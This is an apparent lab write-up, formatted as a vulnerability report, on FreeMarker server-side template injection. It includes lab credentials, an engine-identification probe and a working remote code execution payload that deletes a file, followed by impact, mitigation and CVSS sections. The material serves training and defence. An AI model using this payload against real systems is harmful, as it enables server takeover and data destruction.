# Title: Server-side template injection: Server-side template injection using documentation

## Description

The application is vulnerable to Server-Side Template Injection (SSTI) within the product description template functionality. Authenticated users with content management privileges can modify templates that are subsequently processed by the server-side template engine.

User-controlled template content is evaluated without sufficient restrictions, allowing attackers to inject template expressions that execute on the server. Error messages generated during template processing reveal implementation details about the underlying template engine.

In this case, the application uses the FreeMarker template engine. By leveraging dangerous built-in functionality exposed by FreeMarker, an attacker can instantiate Java classes capable of executing operating system commands, ultimately achieving Remote Code Execution (RCE).

---

## Steps to Exploit

### 1. Authenticate to the Application

Log in using the provided credentials:

```text
Username: content-manager
Password: C0nt3ntM4n4g3r
```

---

### 2. Identify Template Injection

1. Navigate to the product template editing functionality.
2. Modify an existing template expression or insert a new one.

Example:

```freemarker
${foobar}
```

3. Save the template.
4. View the affected product page.

An error message is displayed, revealing details about the template engine.

---

### 3. Identify the Template Engine

The error message indicates that the application uses **FreeMarker** as its template engine.

Example indicators:

```text
freemarker.core.InvalidReferenceException
```

This confirms the presence of a FreeMarker SSTI vulnerability.

---

### 4. Research Dangerous FreeMarker Features

Review the FreeMarker documentation and identify the `new()` built-in, which allows instantiation of Java classes implementing the `TemplateModel` interface.

Documentation analysis reveals the existence of the class:

```text
freemarker.template.utility.Execute
```

This class can execute operating system commands.

---

### 5. Achieve Remote Code Execution

Inject the following payload into the template:

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
```

Save the modified template.

---

### 6. Trigger Payload Execution

1. View the affected product page.
2. The template engine processes the malicious payload.
3. The server executes the supplied operating system command.
4. The target file is deleted, completing the lab objective.

---

## Proof of Concept

### Template Injection Test

```freemarker
${foobar}
```

### Result

```text
freemarker.core.InvalidReferenceException
```

This confirms FreeMarker template processing.

---

### Remote Code Execution Payload

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
```

### Outcome

```text
Operating system command executed successfully
```

The deletion of the target file confirms successful code execution on the server.

---

## Impact

* Remote Code Execution (RCE) on the application server.
* Complete compromise of the affected application.
* Unauthorized access to sensitive files and system resources.
* Ability to modify or delete application data.
* Potential credential theft and privilege escalation.
* Opportunity for persistence and lateral movement within the environment.
* Full loss of confidentiality, integrity, and availability.

---

## Mitigation / Remediation

### 1. Avoid Rendering Untrusted Templates

Do not allow user-controlled content to be interpreted as executable template code.

---

### 2. Sandbox Template Execution

Restrict access to dangerous built-in functionality and Java object instantiation.

Example:

```java
Configuration cfg = new Configuration(Configuration.VERSION_2_3_31);
cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
```

---

### 3. Disable Dangerous Built-ins

Restrict or remove access to:

```text
new()
Execute
ObjectConstructor
```

and other potentially dangerous classes.

---

### 4. Implement Input Validation

Validate and sanitize template content before processing.

---

### 5. Apply Principle of Least Privilege

Run application services using dedicated low-privilege accounts to reduce the impact of successful exploitation.

---

### 6. Conduct Security Reviews

Perform regular code reviews, dependency audits, and penetration testing focused on template injection vulnerabilities.

---

## CVSS Score

**CVSS v3.1 Score:** 9.8 (Critical)

**Vector:**

```text
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
```

---

## CVSS Justification

| Metric              | Value     | Justification                                                   |
| ------------------- | --------- | --------------------------------------------------------------- |
| Attack Vector       | Network   | Exploitable remotely through web requests                       |
| Attack Complexity   | Low       | Requires only template modification and payload injection       |
| Privileges Required | Low       | Requires access to the content management functionality         |
| User Interaction    | None      | No victim interaction required                                  |
| Scope               | Unchanged | Impact remains within the vulnerable application environment    |
| Confidentiality     | High      | Full access to server-side data and files                       |
| Integrity           | High      | Arbitrary modification and deletion of files possible           |
| Availability        | High      | Server functionality can be disrupted through command execution |

---

## Conclusion

The application is vulnerable to Server-Side Template Injection (SSTI) due to unsafe processing of user-controlled FreeMarker templates. Error messages disclose the underlying template engine, enabling attackers to leverage dangerous built-in functionality and achieve Remote Code Execution. Successful exploitation grants the ability to execute arbitrary operating system commands and fully compromise the affected server.
